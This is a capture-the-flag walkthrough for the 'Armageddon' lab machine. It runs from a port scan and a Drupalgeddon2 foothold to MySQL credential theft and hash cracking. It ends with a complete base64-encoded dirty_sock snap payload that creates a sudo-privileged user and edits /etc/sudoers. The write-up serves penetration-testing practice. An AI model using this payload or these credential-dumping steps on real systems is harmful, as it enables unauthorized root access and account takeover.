## Armageddon

Difficulty: Easy

### User Flag

```
rustscan -a armageddon.htb --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://user-images.githubusercontent.com/58514930/219379495-5b6c7d8d-d501-4477-a5b6-8db4b507622c.png)

<br>

Looking at the web page we see that armaggedon is being used.

![armageddon](https://user-images.githubusercontent.com/58514930/219379870-398f8ead-25fd-4641-926c-8ca3394d23cf.png)

<br>

Searching about we find a [possible exploit](https://github.com/dreadlocked/Drupalgeddon2) to it.

![foothold](https://user-images.githubusercontent.com/58514930/219380007-affbc805-4611-4342-8aa4-74fcaedeac13.png)

<br>

Armaggedon has a default configuration file called settings.php. Reading it, we discover the MySQL credentials.

![settings](https://user-images.githubusercontent.com/58514930/219380734-6882fd89-3cd9-45e5-a6eb-0f572356509d.png)

<br>

To dump the database we use:

```
mysql -u drupaluser --password='CQHEy@9M*m23gBVj' -e 'use drupal; select * from users'
```

![accessingMysql](https://user-images.githubusercontent.com/58514930/219380524-6bdfaedb-b76a-46ae-b9f3-3bca5d2c2904.png)

<br>

Crack the hash with john and log into SSH to get the user flag.

![crackingPassword](https://user-images.githubusercontent.com/58514930/219381060-50d429e0-a31e-4f88-bd23-523e4ac6fc46.png)

### Root Flag

Enumerating with sudo -l we see that our user can use snap install as root.

![sudo -l](https://user-images.githubusercontent.com/58514930/219381693-6b1c49a7-2a3f-4306-bc2d-860a91355497.png)

<br>

To exploit this, you can follow [this guide](https://notes.vulndev.io/notes/redteam/privilege-escalation/misc-1).

```
python -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "==")' | base64 -d > payload.snapn
sudo snap install /dev/shm/payload.snap --dangerous --devmode
```

After this commands you can log with dirty_sock:dirty_sock and sudo -i.

![dirty_sock](https://user-images.githubusercontent.com/58514930/219382056-6e2bc2b1-75ec-411f-bbad-9b1ff1c3289e.png)
